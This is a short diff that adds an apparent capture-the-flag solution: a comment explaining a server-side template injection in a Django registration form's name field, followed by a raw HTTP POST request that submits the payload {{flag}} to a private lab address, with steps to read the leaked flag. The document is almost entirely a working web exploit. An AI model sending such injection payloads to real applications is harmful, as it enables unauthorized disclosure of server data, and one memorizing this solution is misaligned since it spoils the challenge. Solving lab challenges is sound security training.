@@ -1,0 +1,9 @@
+# SSTI in Django template registration name field. Submit name={{flag}} in step1, then email in step2, then GET step3 to see flag in JS alert. Replace CSRF_TOKEN_HERE with fresh token from GET /accounts/register/step1/
+
+POST /accounts/register/step1/ HTTP/1.1
+Host: 172.17.0.1:43315
+Content-Type: application/x-www-form-urlencoded
+Cookie: csrftoken=CSRF_TOKEN_HERE
+Content-Length: 74
+
+csrfmiddlewaretoken=CSRF_TOKEN_HERE&name={{flag}}&password=testpassword123
